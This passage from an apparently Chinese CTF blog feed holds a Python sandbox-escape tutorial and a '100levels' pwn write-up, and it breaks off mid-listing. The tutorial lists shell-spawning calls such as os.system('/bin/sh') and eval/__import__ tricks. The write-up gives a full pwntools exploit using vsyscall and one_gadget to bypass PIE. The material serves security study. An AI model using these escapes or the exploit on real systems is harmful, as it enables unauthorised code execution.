&lt;h1 id=&quot;your-pwn&quot;&gt;&lt;a href=&quot;#your-pwn&quot; class=&quot;headerlink&quot; title=&quot;your_pwn&quot;&gt;&lt;/a&gt;your_pwn&lt;/h1&gt;&lt;h2
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="stack" scheme="http://siriuswhiter.tk/tags/stack/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>Escape from python-jail</title>
    <link href="http://siriuswhiter.tk/2019/04/08/escape-from-python-jail/"/>
    <id>http://siriuswhiter.tk/2019/04/08/escape-from-python-jail/</id>
    <published>2019-04-08T13:05:19.000Z</published>
    <updated>2019-04-22T12:30:32.941Z</updated>
    
    <content type="html"><![CDATA[<h1 id="python-沙盒"><a href="#python-沙盒" class="headerlink" title="python 沙盒"></a>python 沙盒</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>python沙盒逃逸其实就是如何通过绕过限制，拿到出题人或者安全运维人员不想让我们拿到的”危险函数”，或者绕过Python终端达到命令执行的效果。</p><p>从这个角度来讲，沙盒逃逸本身更像是偏web的东西，就像是sql注入在被过滤的剩余字符中通过骚操作来执行不该被执行的命令一样。</p><h2 id="任意执行命令的一些函数和模块"><a href="#任意执行命令的一些函数和模块" class="headerlink" title="任意执行命令的一些函数和模块"></a>任意执行命令的一些函数和模块</h2><ol start="0"><li><strong>import</strong> 函数</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&apos;os&apos;).system(&apos;dir&apos;)</span><br></pre></td></tr></table></figure><ol><li>os 模块</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">os.system(&quot;/bin/sh&quot;)</span><br><span class="line"></span><br><span class="line">os.popen(&quot;/bin/sh&quot;)</span><br></pre></td></tr></table></figure><p>很少不被禁，不然很容易被利用getshell<br>官方文档 <a href="https://docs.python.org/2/library/os.html" target="_blank" rel="noopener">https://docs.python.org/2/library/os.html</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt; os.system(&quot;/bin/sh&quot;)</span><br><span class="line">$ whoami</span><br><span class="line">sirius</span><br></pre></td></tr></table></figure><ol start="2"><li>exec &amp; eval 函数</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval(&apos;__import__(&quot;os&quot;).system(&quot;dir&quot;)&apos;)</span><br><span class="line"></span><br><span class="line">exec(&apos;__import__(&quot;os&quot;).system(&quot;dir&quot;)&apos;)</span><br></pre></td></tr></table></figure><p>两个执行函数，没什么可说的。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; eval(&apos;__import__(&quot;os&quot;).system(&quot;/bin/sh&quot;)&apos;)</span><br><span class="line">$ whoami</span><br><span class="line">sirius</span><br></pre></td></tr></table></figure></p><ol start="3"><li>execfile 函数</li></ol><p>执行文件，主要用于引入模块来执行命令<br>python3不存在</p><ol start="4"><li>timeit 函数 from timeit 模块</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import timeit</span><br><span class="line">timeit.timeit(&apos;__import__(&quot;os&quot;).system(&quot;dir&quot;)&apos;,number=1)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import timeit</span><br><span class="line">&gt;&gt;&gt; timeit.timeit(&apos;__import__(&quot;os&quot;).system(&quot;sh&quot;)&apos;,number=1)</span><br><span class="line">$ whoami</span><br><span class="line">sirius</span><br></pre></td></tr></table></figure><ol start="5"><li>platform 模块</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import platform </span><br><span class="line">print platform.popen(&apos;dir&apos;).read()</span><br></pre></td></tr></table></figure><p>platform提供了很多方法去获取操作系统的信息，popen函数可以执行任意命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import platform </span><br><span class="line">&gt;&gt;&gt; print platform.popen(&apos;dir&apos;).read()</span><br><span class="line">jail.py</span><br></pre></td></tr></table></figure><ol start="6"><li>Filetype 函数 from types 模块</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import types</span><br><span class="line">print types.FileType(&quot;flag&quot;).read()</span><br></pre></td></tr></table></figure><p>可以用来读取文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import types</span><br><span class="line">&gt;&gt;&gt; print types.FileType(&quot;flag&quot;).read()</span><br><span class="line">flag_here</span><br></pre></td></tr></table></figure></p><ol start="7"><li>commands 模块</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import commands</span><br><span class="line">print commands.getoutput(&quot;dir&quot;)</span><br><span class="line">print commands.getstatusoutput(&quot;dir&quot;)</span><br></pre></td></tr></table></figure><p>依旧可以用来执行部分指令，貌似不可以拿shell，但其他的很多都可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import commands</span><br><span class="line">&gt;&gt;&gt; print commands.getoutput(&quot;dir&quot;)</span><br><span class="line">flag  jail.py</span><br><span class="line">&gt;&gt;&gt; print commands.getstatusoutput(&quot;dir&quot;)</span><br><span class="line">(0, &apos;flag  jail.py&apos;)</span><br></pre></td></tr></table></figure><ol start="8"><li>subprocess模块</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">subprocess.call([&apos;ls&apos;],shell=True)</span><br></pre></td></tr></table></figure><p>shell=True 命令本身被bash启动，支持shell启动，否则不支持</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import subprocess</span><br><span class="line">&gt;&gt;&gt; subprocess.call([&apos;ls&apos;],shell=True)</span><br><span class="line">flag  jail.py</span><br></pre></td></tr></table></figure><ol start="9"><li>compile 函数</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>菜鸟：<a href="http://www.runoob.com/python/python-func-compile.html" target="_blank" rel="noopener">http://www.runoob.com/python/python-func-compile.html</a></p><ol start="10"><li>f修饰符</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f&apos;&#123;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#125;&apos;</span><br></pre></td></tr></table></figure><p>python 3.6加上的新特性，用f,F修饰的字符串可以执行代码。</p><p>关于python内部查看版本号，可以使用sys模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import sys</span><br><span class="line">&gt;&gt;&gt; print sys.version</span><br><span class="line">2.7.12 (default, Nov 12 2018, 14:36:49) </span><br><span class="line">[GCC 5.4.0 20160609]</span><br></pre></td></tr></table></figure><h2 id="绕过检查"><a href="#绕过检查" class="headerlink" title="绕过检查"></a>绕过检查</h2><h3 id="import-os-引入"><a href="#import-os-引入" class="headerlink" title="import / os 引入"></a>import / os 引入</h3><ol><li>加解密绕过</li></ol><p>使用 python 内置函数 <strong>builtins</strong> (该函数模块中的函数都被自动引入，不需要再单独引入) , dir(<strong>builtins</strong>) 查看剩余可用内置函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; dir(__builtins__)</span><br><span class="line">[&apos;ArithmeticError&apos;, &apos;AssertionError&apos;, &apos;AttributeError&apos;, &apos;BaseException&apos;, &apos;BufferError&apos;, &apos;BytesWarning&apos;, &apos;DeprecationWarning&apos;, &apos;EOFError&apos;, &apos;Ellipsis&apos;, &apos;EnvironmentError&apos;, &apos;Exception&apos;, &apos;False&apos;, &apos;FloatingPointError&apos;, &apos;FutureWarning&apos;, &apos;GeneratorExit&apos;, &apos;IOError&apos;, &apos;ImportError&apos;, &apos;ImportWarning&apos;, &apos;IndentationError&apos;, &apos;IndexError&apos;, &apos;KeyError&apos;, &apos;KeyboardInterrupt&apos;, &apos;LookupError&apos;, &apos;MemoryError&apos;, &apos;NameError&apos;, &apos;None&apos;, &apos;NotImplemented&apos;, &apos;NotImplementedError&apos;, &apos;OSError&apos;, &apos;OverflowError&apos;, &apos;PendingDeprecationWarning&apos;, &apos;ReferenceError&apos;, &apos;RuntimeError&apos;, &apos;RuntimeWarning&apos;, &apos;StandardError&apos;, &apos;StopIteration&apos;, &apos;SyntaxError&apos;, &apos;SyntaxWarning&apos;, &apos;SystemError&apos;, &apos;SystemExit&apos;, &apos;TabError&apos;, &apos;True&apos;, &apos;TypeError&apos;, &apos;UnboundLocalError&apos;, &apos;UnicodeDecodeError&apos;, &apos;UnicodeEncodeError&apos;, &apos;UnicodeError&apos;, &apos;UnicodeTranslateError&apos;, &apos;UnicodeWarning&apos;, &apos;UserWarning&apos;, &apos;ValueError&apos;, &apos;Warning&apos;, &apos;ZeroDivisionError&apos;, &apos;__debug__&apos;, &apos;__doc__&apos;, &apos;__import__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;abs&apos;, &apos;all&apos;, &apos;any&apos;, &apos;apply&apos;, &apos;basestring&apos;, &apos;bin&apos;, &apos;bool&apos;, &apos;buffer&apos;, &apos;bytearray&apos;, &apos;bytes&apos;, &apos;callable&apos;, &apos;chr&apos;, &apos;classmethod&apos;, &apos;cmp&apos;, &apos;coerce&apos;, &apos;compile&apos;, &apos;complex&apos;, &apos;copyright&apos;, &apos;credits&apos;, &apos;delattr&apos;, &apos;dict&apos;, &apos;dir&apos;, &apos;divmod&apos;, &apos;enumerate&apos;, &apos;eval&apos;, &apos;execfile&apos;, &apos;exit&apos;, &apos;file&apos;, &apos;filter&apos;, &apos;float&apos;, &apos;format&apos;, &apos;frozenset&apos;, &apos;getattr&apos;, &apos;globals&apos;, &apos;hasattr&apos;, &apos;hash&apos;, &apos;help&apos;, &apos;hex&apos;, &apos;id&apos;, &apos;input&apos;, &apos;int&apos;, &apos;intern&apos;, &apos;isinstance&apos;, &apos;issubclass&apos;, &apos;iter&apos;, &apos;len&apos;, &apos;license&apos;, &apos;list&apos;, &apos;locals&apos;, &apos;long&apos;, &apos;map&apos;, &apos;max&apos;, &apos;memoryview&apos;, &apos;min&apos;, &apos;next&apos;, &apos;object&apos;, &apos;oct&apos;, &apos;open&apos;, &apos;ord&apos;, &apos;pow&apos;, &apos;print&apos;, &apos;property&apos;, &apos;quit&apos;, &apos;range&apos;, &apos;raw_input&apos;, &apos;reduce&apos;, &apos;reload&apos;, &apos;repr&apos;, &apos;reversed&apos;, &apos;round&apos;, &apos;set&apos;, &apos;setattr&apos;, &apos;slice&apos;, &apos;sorted&apos;, &apos;staticmethod&apos;, &apos;str&apos;, &apos;sum&apos;, &apos;super&apos;, &apos;tuple&apos;, &apos;type&apos;, &apos;unichr&apos;, &apos;unicode&apos;, &apos;vars&apos;, &apos;xrange&apos;, &apos;zip&apos;]</span><br></pre></td></tr></table></figure><p>这里是在没有禁用函数时的情况， 可以看到里面有一些一般不会禁用的函数比如说对文件的操作函数 open，int，chr等，还有dict函数</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;python-沙盒&quot;&gt;&lt;a href=&quot;#python-沙盒&quot; class=&quot;headerlink&quot; title=&quot;python 沙盒&quot;&gt;&lt;/a&gt;python 沙盒&lt;/h1&gt;&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="python" scheme="http://siriuswhiter.tk/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-pwn prac</title>
    <link href="http://siriuswhiter.tk/2019/04/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-prac/"/>
    <id>http://siriuswhiter.tk/2019/04/06/攻防世界-pwn-prac/</id>
    <published>2019-04-06T06:32:55.000Z</published>
    <updated>2019-04-22T12:03:12.235Z</updated>
    
    <content type="html"><![CDATA[<h1 id="100levels"><a href="#100levels" class="headerlink" title="100levels"></a>100levels</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>检查<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure></p><p>两个功能： go hint</p><p>go:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall go(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // ST0C_4</span><br><span class="line">  __int64 v4; // [rsp+0h] [rbp-120h]</span><br><span class="line">  __int64 num2; // [rsp+0h] [rbp-120h]</span><br><span class="line">  int v6; // [rsp+8h] [rbp-118h]</span><br><span class="line">  __int64 num1; // [rsp+10h] [rbp-110h]</span><br><span class="line">  signed __int64 num1a; // [rsp+10h] [rbp-110h]</span><br><span class="line">  signed __int64 cnt; // [rsp+18h] [rbp-108h]</span><br><span class="line">  __int64 v10; // [rsp+20h] [rbp-100h]</span><br><span class="line"></span><br><span class="line">  puts(&quot;How many levels?&quot;);</span><br><span class="line">  v4 = get_num();</span><br><span class="line">  if ( v4 &gt; 0 )</span><br><span class="line">    num1 = v4;</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;Coward&quot;);</span><br><span class="line">  puts(&quot;Any more?&quot;);</span><br><span class="line">  num2 = get_num();</span><br><span class="line">  num1a = num1 + num2;</span><br><span class="line">  if ( num1a &gt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( num1a &lt;= 99 )</span><br><span class="line">    &#123;</span><br><span class="line">      cnt = num1a;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;You are being a real man.&quot;);</span><br><span class="line">      cnt = 100LL;</span><br><span class="line">    &#125;</span><br><span class="line">    puts(&quot;Let&apos;s go!&apos;&quot;);</span><br><span class="line">    v6 = time(0LL);</span><br><span class="line">    if ( (unsigned int)check(cnt) != 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = time(0LL);</span><br><span class="line">      sprintf((char *)&amp;v10, &quot;Great job! You finished %d levels in %d seconds\n&quot;, cnt, (unsigned int)(v3 - v6), num2);</span><br><span class="line">      puts((const char *)&amp;v10);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;You failed.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  return puts(&quot;Coward Coward Coward Coward Coward&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>go调用的check<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall check(signed int cnt)</span><br><span class="line">&#123;</span><br><span class="line">  int v2; // eax</span><br><span class="line">  __int64 v3; // rax</span><br><span class="line">  __int64 buf; // [rsp+10h] [rbp-30h]</span><br><span class="line">  __int64 v5; // [rsp+18h] [rbp-28h]</span><br><span class="line">  __int64 v6; // [rsp+20h] [rbp-20h]</span><br><span class="line">  __int64 v7; // [rsp+28h] [rbp-18h]</span><br><span class="line">  unsigned int v8; // [rsp+34h] [rbp-Ch]</span><br><span class="line">  unsigned int num2; // [rsp+38h] [rbp-8h]</span><br><span class="line">  unsigned int num1; // [rsp+3Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  buf = 0LL;</span><br><span class="line">  v5 = 0LL;</span><br><span class="line">  v6 = 0LL;</span><br><span class="line">  v7 = 0LL;</span><br><span class="line">  if ( !cnt )</span><br><span class="line">    return 1LL;</span><br><span class="line">  if ( (unsigned int)check(cnt - 1) == 0 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  num1 = rand() % cnt;</span><br><span class="line">  v2 = rand();</span><br><span class="line">  num2 = v2 % cnt;</span><br><span class="line">  v8 = v2 % cnt * num1;</span><br><span class="line">  puts(&quot;====================================================&quot;);</span><br><span class="line">  printf(&quot;Level %d\n&quot;, (unsigned int)cnt);</span><br><span class="line">  printf(&quot;Question: %d * %d = ? Answer:&quot;, num1, num2);</span><br><span class="line">  read(0, &amp;buf, 0x400uLL);                      // overflow</span><br><span class="line">  v3 = strtol((const char *)&amp;buf, 0LL, 10);</span><br><span class="line">  return v3 == v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>hint<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">int hint()</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 v1; // [rsp+8h] [rbp-108h]</span><br><span class="line">  int v2; // [rsp+10h] [rbp-100h]</span><br><span class="line">  __int16 v3; // [rsp+14h] [rbp-FCh]</span><br><span class="line"></span><br><span class="line">  if ( flag )</span><br><span class="line">  &#123;</span><br><span class="line">    sprintf((char *)&amp;v1, &quot;Hint: %p\n&quot;, &amp;system, &amp;system);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = &apos;N NWP ON&apos;;</span><br><span class="line">    v2 = &apos;UF O&apos;;</span><br><span class="line">    v3 = &apos;N&apos;;</span><br><span class="line">  &#125;</span><br><span class="line">  return puts((const char *)&amp;v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h3><p>容易发现的漏洞就是check时的溢出，还有问题就是go初始时输入两次值，最后使用的是两次加起来的值，但是如果第一次输入的值小于等于0就不会初始化第一个值。</p><p>最刚开始的想法是通过溢出修改存储在bss段的flag位然后返回到主函数，再使用hint泄露system函数地址<br>但是因为程序开启了pie，因此bss段位置也就是不定的，而如果想要泄露libc，又因为是64位程序，因此需要gadget，但是gadgets的位置也因为pie变得位置不定，所以行不通。</p><p>再观察程序，发现：<br>hint函数是先将system函数地址读到了栈上，之后调用fprintf函数输出的，其地址为rbp-0x110<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var_110         = qword ptr -110h</span><br><span class="line"></span><br><span class="line">mov     rax, cs:system_ptr</span><br><span class="line">mov     [rbp+var_110], rax</span><br></pre></td></tr></table></figure></p><p>而如果go读取的第一个数没有初始化的话，他的值就是栈上的值，而它的地址恰巧也是rbp-0x110<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__int64 num1; // [rsp+10h] [rbp-110h]</span><br></pre></td></tr></table></figure></p><p>所以我们按理说是可以利用那个对大小判断的函数来逐位爆破system的地址<br>这里需要注意的是如果和大于0进入check，如果顺着令其运行完会直接退出，所以也需要在check中溢出覆盖返回地址以便能够继续爆破</p><p>而覆盖的返回地址依旧是不确定的，观察程序运行时的内存映射，发现程序的最后vsyscall段是恒定不变的，我们可以利用它来绕过pie；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10i 0xffffffffff600400</span><br><span class="line">   0xffffffffff600400:mov    rax,0xc9</span><br><span class="line">   0xffffffffff600407:syscall </span><br><span class="line">   0xffffffffff600409:ret    </span><br><span class="line">   0xffffffffff60040a:int3   </span><br><span class="line">   0xffffffffff60040b:int3</span><br></pre></td></tr></table></figure></p><h3 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h3><p>思路一没有复现成功，看到了大佬们的简单一点的思路</p><p>前面基本一致，但是不再去爆破system的地址，而是将其覆盖位one_gadget的地址，也就是计算二者偏移的差值然后将其加上去直接得到one_gadget RCE,可以看到这个地址被存放在了栈上，我们的目标就是在后面的栈溢出中想办法使得返回到此处。</p><p>执行最后一次时的栈情况：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">03:0018│ rsi  0x7ffe36cd7780 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">07:0038│      0x7ffe36cd77a0 ◂— 0x1ae00000000</span><br><span class="line">08:0040│      0x7ffe36cd77a8 ◂— 0x2b0000000a /* &apos;\n&apos; */</span><br><span class="line">09:0048│ rbp  0x7ffe36cd77b0 —▸ 0x7ffe36cd78e0 —▸ 0x7ffe36cd7920 —▸ 0x556f0672efd0 ◂— push   r15</span><br><span class="line">0a:0050│      0x7ffe36cd77b8 —▸ 0x556f0672ec8a ◂— test   eax, eax</span><br><span class="line">0b:0058│      0x7ffe36cd77c0 ◂— 0xfffffffffffffeda</span><br><span class="line">0c:0060│      0x7ffe36cd77c8 ◂— 0x556f5caa9f45       -------》 one_gadget 在这里</span><br></pre></td></tr></table></figure></p><p>我们就可以使用vsyscall中的不变量来使返回地址滑向此处执行one_gadget</p><ul><li>关于 vsyscall</li></ul><p>简单地说，现代的Windows/*Unix操作系统都采用了分级保护的方式，内核代码位于R0，用户代码位于R3。许多对硬件和内核等的操作都会被包装成内核函数并提供一个接口给用户层代码调用，这个接口就是我们熟知的int 0x80/syscall+调用号模式。当我们每次调用这个接口时，为了保证数据的隔离，我们需要把当前的上下文(寄存器状态等)保存好，然后切换到内核态运行内核函数，然后将内核函数返回的结果放置到对应的寄存器和内存中，再恢复上下文，切换到用户模式。这一过程需要耗费一定的性能。对于某些系统调用，如gettimeofday来说，由于他们经常被调用，如果每次被调用都要这么来回折腾一遍，开销就会变成一个累赘。因此系统把几个常用的无参内核调用从内核中映射到用户空间中，这就是vsyscall.</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">system_offset = 0x45390</span><br><span class="line">ret_address = 0xffffffffff600400</span><br><span class="line">target_offset = 0x4526a</span><br><span class="line"></span><br><span class="line">difference = target_offset - system_offset</span><br><span class="line"></span><br><span class="line">def answer(eqn):</span><br><span class="line">    parse = eqn[9:eqn.find(&quot;=&quot;)]</span><br><span class="line">    soln = eval(parse)</span><br><span class="line">    return soln</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    p = process(&quot;./100levels&quot;)</span><br><span class="line">    #p = remote(&quot;47.74.147.103&quot;, 20001)</span><br><span class="line"></span><br><span class="line">    p.sendline(&quot;2&quot;)</span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(&quot;1&quot;)</span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(&quot;0&quot;)</span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(str(difference))</span><br><span class="line"></span><br><span class="line">    for i in range(99):</span><br><span class="line">        p.recvline_contains(&quot;Level&quot;)</span><br><span class="line">        eqn = p.clean()</span><br><span class="line"></span><br><span class="line">        soln = answer(eqn)</span><br><span class="line">        p.send(str(soln)+&quot;\x00&quot;)</span><br><span class="line">       </span><br><span class="line"></span><br><span class="line">    pay = str(soln) + &quot;\x00&quot;</span><br><span class="line">    pay = pay.ljust(56, &quot;B&quot;)</span><br><span class="line">    pay += p64(ret_address)*3</span><br><span class="line">    log.info(&quot;Injected our vsyscall ROPs&quot;)</span><br><span class="line"></span><br><span class="line">    p.send(pay)</span><br><span class="line">    p.clean()</span><br><span class="line"></span><br><span class="line">    p.success(&quot;Shell spawned! Enjoy!&quot;)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>未成功的思路一</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 